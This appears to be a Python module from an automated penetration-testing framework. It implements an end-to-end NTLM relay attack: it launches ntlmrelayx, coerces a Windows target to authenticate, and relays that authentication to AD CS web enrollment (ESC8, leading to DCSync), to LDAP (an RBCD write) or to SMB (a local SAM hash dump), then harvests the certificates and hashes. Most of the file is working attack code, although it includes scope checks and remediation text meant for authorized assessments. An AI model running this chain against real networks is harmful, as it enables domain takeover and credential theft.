# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Built-in NTLM relay orchestration (coerce -> relay -> loot).

Performs an actual NTLM relay end to end instead of only *detecting* that one is
possible: starts ``ntlmrelayx`` as a background listener, coerces the assessment
target to authenticate into it, waits for the relayed session to complete its
action, parses the result, and cleans the listener up.

Scope
-----
Both hosts pass through the authorization gate. ``target`` is the host coerced —
it is the target defined when the assessment was launched (the sequence pins it,
or the operator passes it to ``run``) and the base :class:`MacroTool` authorizes
it. ``relay_to`` (the relay destination) is authorized here explicitly, so the
relay can never be pointed at a host outside the engagement scope.

Privilege
---------
``ntlmrelayx`` binds privileged ports (445/80) to receive the coerced auth, so
this needs **root** — run via ``sudo autopwn ...``. The web console runs as a
non-root service and will report that clearly rather than fail silently.

Modes
-----
* ``adcs`` (default): relay to AD CS web enrollment (ESC8) for a certificate of
  the coerced machine account -> authenticate it -> DCSync.
* ``ldap``: relay to LDAP and write RBCD (resource-based constrained delegation).
* ``smb``: relay to an SMB-signing-disabled host and dump its local SAM.
"""
from __future__ import annotations

import os
import re
import signal
import subprocess
import time
from pathlib import Path
from typing import Any

from ..authorization import ScopeError
from .macro import MacroTool, Results
from .runner import which


class NtlmRelayTool(MacroTool):
    name = "ntlm_relay"
    category = "ad-smb"
    active = True
    #: authorize the *coerced* host (the launch/assessment target) via the base class
    host_param = "target"
    plan = [
        "Authorize both the coerced target and the relay destination against scope",
        "Start ntlmrelayx as a background listener aimed at the relay destination",
        "Coerce the assessment target to authenticate into the listener (coercer)",
        "Wait for the relayed session, then parse the result "
        "(ESC8 certificate / RBCD write / SAM dump)",
        "Terminate the listener and clean up",
    ]
    description = (
        "Perform an NTLM relay end to end against the assessment target: start "
        "ntlmrelayx, coerce the target to authenticate into it, and capture the "
        "result. mode=adcs (default) relays to AD CS web enrollment (ESC8) for a "
        "machine certificate -> DCSync; mode=ldap writes RBCD; mode=smb dumps the "
        "SAM on an unsigned host. Both the coerced target and the relay destination "
        "must be in scope. REQUIRES ROOT (binds 445/80) — run via sudo. This "
        "executes the relay that the smb-relay / relay-adcs-esc8 findings identify.")
    parameters = {
        "type": "object",
        "properties": {
            "target": {"type": "string",
                       "description": "Host to coerce — the target defined at launch "
                                      "(a DC / coercible host). Must be in scope."},
            "relay_to": {"type": "string",
                         "description": "Relay destination: the CA host (adcs), another "
                                        "DC (ldap), or an SMB-signing-disabled host (smb). "
                                        "Must be in scope. Defaults to target."},
            "mode": {"type": "string", "description": "adcs (default) | ldap | smb."},
            "username": {"type": "string", "description": "Domain user for the coercion."},
            "password": {"type": "string", "description": "Password for the coercion."},
            "domain": {"type": "string", "description": "AD domain (optional)."},
            "listener": {"type": "string",
                         "description": "Attacker IP the target coerces to "
                                        "(default: our route to the target)."},
            "template": {"type": "string",
                         "description": "adcs certificate template (default DomainController)."},
        },
        "required": ["target"],
    }

    def execute(self, R: Results, **kw: Any) -> None:
        target = kw["target"]                       # already scope-authorized by run()
        relay_to = (kw.get("relay_to") or target).strip()
        mode = (kw.get("mode") or "adcs").lower().strip()

        # --- scope gate on the SECOND host (authorization is the primary gate) ---
        # target is authorized by the base class; the relay destination must be too,
        # so the relay can never be pointed outside the launched engagement scope.
        try:
            self._ctx.scope.authorize(relay_to)
        except ScopeError as e:
            self.log(f"[!] relay destination refused: {e}")
            return

        # --- privilege gate -------------------------------------------------
        if not hasattr(os, "geteuid") or os.geteuid() != 0:
            self.log("[!] ntlm_relay needs root to bind the relay listener (445/80). "
                     "Re-run from the CLI as root:  sudo autopwn run --tool ntlm_relay "
                     f"--set target={target} --set relay_to={relay_to} --set mode={mode}")
            return

        if relay_to == target:
            self.log("[!] relay_to equals the coerced target (reflection) — this is "
                     "patched on modern Windows. Set --set relay_to=<other in-scope host> "
                     "(the CA for adcs, another DC for ldap, an unsigned host for smb).")

        # --- tooling --------------------------------------------------------
        relayx = which("ntlmrelayx.py") or which("impacket-ntlmrelayx")
        if not relayx:
            self.log("[!] ntlmrelayx not installed (impacket).")
            return
        # Coercion trigger: prefer standalone coercer; otherwise fall back to
        # NetExec's coerce_plus module (nxc -M coerce_plus -o LISTENER=<ip>), which
        # is part of the same toolchain and is usually already present.
        if which("coercer") or which("coerce_plus"):
            coerce_via = "coercer"
        elif which("nxc") or which("netexec"):
            coerce_via = "nxc"
        else:
            self.log("[!] no coercion tool available (coercer or nxc) — cannot "
                     "trigger the authentication.")
            return

        listener = kw.get("listener") or self._local_ip(target)
        if not listener:
            self.log("[!] could not determine a listener IP; pass --set listener=<attacker-ip>.")
            return

        # --- build the ntlmrelayx invocation per mode -----------------------
        if mode == "adcs":
            template = kw.get("template") or "DomainController"
            endpoint = f"http://{relay_to}/certsrv/certfnsh.asp"
            args = ["-t", endpoint, "-smb2support", "--adcs", "--template", template]
            goal = f"AD CS ESC8 (template {template})"
        elif mode == "ldap":
            args = ["-t", f"ldap://{relay_to}", "-smb2support",
                    "--delegate-access", "--no-dump", "--no-da", "--no-acl"]
            goal = "LDAP RBCD write"
        else:
            mode = "smb"
            args = ["-t", f"smb://{relay_to}", "-smb2support"]
            goal = "SMB SAM dump"

        log = Path("/tmp") / "autopwn-relay.log"
        try:
            log.unlink()
        except OSError:
            pass

        self.log(f"[run] ntlmrelayx -> {relay_to}  [{goal}], listener {listener}")
        # ntlmrelayx's main thread blocks on a stdin read; with a closed stdin
        # (DEVNULL) it hits EOF and exits right after "waiting for connections",
        # taking its listener threads with it — so the coerced auth lands on a
        # dead port 445. Give it a pseudo-TTY on stdin so it stays alive (the same
        # reason it survives under tmux/screen but not `nohup … &`). Verified live.
        import pty
        master_fd = None
        try:
            master_fd, slave_fd = pty.openpty()
            fh = open(log, "w")
            proc = subprocess.Popen(
                [relayx, *args], stdout=fh, stderr=subprocess.STDOUT,
                stdin=slave_fd, preexec_fn=os.setsid)
            os.close(slave_fd)
        except Exception as e:
            self.log(f"[!] failed to start ntlmrelayx: {e}")
            return

        try:
            # wait for the SMB listener to actually bind 445 before coercing
            for _ in range(12):
                time.sleep(1)
                if _port_listening(445):
                    break
            else:
                self.log("[!] ntlmrelayx never bound 445 — is smbd holding it? "
                         "stop it first: sudo systemctl stop smbd nmbd")
            self.log(f"[run] coercing {target} to authenticate to {listener} (via {coerce_via})")
            if coerce_via == "coercer":
                self.sub("coercer", target=target, listener=listener,
                         username=kw.get("username", ""), password=kw.get("password", ""),
                         domain=kw.get("domain", ""))
            else:
                self.sub("netexec_module", target=target, protocol="smb",
                         module="coerce_plus", module_options=f"LISTENER={listener}",
                         username=kw.get("username", ""), password=kw.get("password", ""),
                         domain=kw.get("domain", ""))
            time.sleep(18)                           # let the relay + action finish
        finally:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except Exception:
                pass
            if master_fd is not None:
                try:
                    os.close(master_fd)
                except Exception:
                    pass
            try:
                fh.close()
            except Exception:
                pass
            time.sleep(1)

        out = log.read_text(errors="ignore") if log.exists() else ""
        for line in [l for l in out.splitlines() if l.strip()][-40:]:
            self.log(f"    {line}")
        self._parse(out, mode, target, relay_to)

    # ---- result parsing ----------------------------------------------------
    def _parse(self, out: str, mode: str, target: str, relay_to: str) -> None:
        if not out.strip():
            self.log("no relay output captured — the target may not be coercible, "
                     "or nothing authenticated within the window.")
            return

        if mode == "adcs":
            m = re.search(
                r"Base64 certificate of user[^\n]*\n((?:[A-Za-z0-9+/=]+\n)+)", out)
            # impacket's ESC8 success lines (verified live against a real CA):
            #   "GOT CERTIFICATE! ID n" / "Writing PKCS#12 certificate to ./HOST.pfx"
            saved = re.search(
                r"(?:Writing PKCS#12 certificate to|Saved (?:PKCS#12|certificate)[^\n]*?to)\s*"
                r"(\S+\.pfx)", out)
            if (m or saved or "GOT CERTIFICATE" in out.upper()
                    or "certificate successfully written" in out.lower()):
                if saved:
                    self.set_var("pfx", saved.group(1))
                self.add_loot(
                    f"Machine certificate for {target} (ESC8 relay via {relay_to})",
                    "authenticate it: certipy auth -pfx <file>  /  gettgtpkinit -> DCSync")
                self.add_finding(
                    "NTLM Relay to AD CS ESC8 — Machine Certificate Obtained", "Critical",
                    cvss="9.8",
                    description=(f"The coerced machine account of {target} was relayed to "
                                 f"AD CS web enrollment on {relay_to} (ESC8) and a "
                                 "certificate was issued. Authenticating with it yields the "
                                 "host's TGT/NT hash — a DC certificate enables DCSync of the "
                                 "whole domain."),
                    recommendation=("Enforce HTTPS + Extended Protection for Authentication "
                                    "(EPA) on the CA web enrollment endpoints, disable NTLM "
                                    "to the CA, and require SMB signing to stop the coercion."))
            else:
                self.log("relay ran but no certificate was captured — confirm the target is "
                         "coercible and the CA web-enrollment URL is reachable over HTTP.")

        elif mode == "ldap":
            if re.search(r"Delegation rights|granted delegation|written successfully|"
                         r"Adding new computer|created successfully", out, re.I):
                self.add_finding(
                    "NTLM Relay to LDAP — RBCD Write", "Critical", cvss="9.0",
                    description=(f"Relayed authentication from {target} to LDAP on {relay_to} "
                                 "wrote resource-based constrained delegation, letting the "
                                 "attacker impersonate any user (including Domain Admins) to "
                                 "the coerced host."),
                    recommendation=("Require LDAP signing + channel binding, enforce SMB "
                                    "signing, and disable NTLM."))
            else:
                self.log("relay ran but the RBCD write was not confirmed in the output.")

        else:  # smb
            got = False
            for m in re.finditer(r"^(\S+?):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", out, re.M):
                got = True
                self.add_cred(m.group(1), m.group(2), kw_domain(out),
                              note=f"relay-SAM({relay_to})")
            if got or "Dumping local SAM" in out:
                self.add_finding(
                    "NTLM Relay to SMB — Local SAM Dumped", "High", cvss="8.1",
                    description=(f"Relayed authentication from {target} to {relay_to} "
                                 "(SMB signing not enforced) dumped the local SAM database, "
                                 "yielding local administrator hashes for pass-the-hash and "
                                 "lateral movement."),
                    recommendation="Enforce SMB signing (Require) on all hosts and disable NTLM.")
            else:
                self.log("relay ran but no SAM hashes were dumped — the relayed identity may "
                         "not be a local admin on the relay destination.")

    # ---- helper ------------------------------------------------------------
    @staticmethod
    def _local_ip(target: str) -> str:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, 9))
            return s.getsockname()[0]
        except OSError:
            return ""
        finally:
            s.close()


def kw_domain(out: str) -> str:
    """Best-effort domain from a relayed SMB banner, else empty."""
    m = re.search(r"\(domain:([A-Za-z0-9.\-]+)\)", out)
    return m.group(1) if m else ""


def _port_listening(port: int) -> bool:
    """True if something on this host is accepting connections on *port* — used to
    confirm ntlmrelayx's SMB server bound 445 before we trigger the coercion."""
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    try:
        return s.connect_ex(("127.0.0.1", port)) == 0
    except OSError:
        return False
    finally:
        s.close()
